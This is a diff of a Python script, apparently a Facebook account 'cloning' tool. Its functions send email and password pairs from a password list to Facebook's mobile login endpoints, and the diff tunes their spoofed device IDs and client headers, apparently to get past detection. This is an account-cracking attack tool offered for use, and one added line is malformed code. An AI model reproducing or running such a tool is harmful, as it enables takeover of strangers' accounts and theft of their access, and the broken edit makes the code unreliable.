@@ -55,7 +55,7 @@ logo = ("""\033[1;32m
  Facebook  : RB RAHUL CMD(RB Brand)
  Status    : Free
  Tool Type : File Cloning
- Version   : 6.3.2
+ Version   : 6.3.4
 ----------------------------------------------
  Note: Use Fligt Mode ON/OFf When Start CMD 
 \033[1;37m----------------------------------------------""")
@@ -684,7 +684,7 @@ def api2(ids,names,passlist):
                                 ua_string = f'Davik/2.1.0 (linex; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                                 device_id = str(uuid.uuid4())
                                 adid = str(uuid.uuid4())
-                                data = {'adid':"eb2ccb51-2a02-48b3-af3f-112cb29bcb52",
+                                data = {'adid':"9e0f3002-43fc-4358-89f1-5622b403d502",
                                         'email':ids,
                                         'password':pas,
                                         'cpl':'true',
@@ -697,7 +697,7 @@ def api2(ids,names,passlist):
                                         'generate_machine_id':'1',
                                         "locale":"en_US","client_country_code":"US",
                                         'device':gtt,
-                                        'device_id':"848eb76f-643b-45b8-883b-2c436d5930f2",
+                                        'device_id':"6e18861e-d578-4cfb-8728-528f1e4b90e7",
                                         "method": "auth.login",
                                         "fb_api_req_friendly_name": "authLogin",
                                         "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
@@ -712,7 +712,7 @@ def api2(ids,names,passlist):
                                         'x-fb-connection-quality':'GOOD',
                                         'x-fb-friendly-name':'authLogin',
                                         'accept-encoding':'gzip, deflate',
-                                        'x-fb-http-engine':     'Apache'}
+                                        'x-fb-http-engine':     'Liger'}
                                 url = ' https://b-api.facebook.com/method/auth.login'
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
@@ -768,7 +768,7 @@ def api3(ids,names,passlist):
                                         'generate_machine_id':'1',
                                         "locale":"es_CU","client_country_code":"CU",
                                         'device':gtt,
-                                        'device_id':'0cd272a7-17dc-4766-958e-5b48799250b',
+                                        'device_id':adid',
                                         "method": "auth.login",
                                         "fb_api_req_friendly_name": "authLogin",
                                         "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
@@ -783,7 +783,7 @@ def api3(ids,names,passlist):
                                         'x-fb-connection-quality':'EXCELLENT',
                                         'x-fb-friendly-name':'authenticate',
                                         'accept-encoding':'gzip, deflate',
-                                        'x-fb-http-engine':'Apache'}
+                                        'x-fb-http-engine':'Liger'}
                                 url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
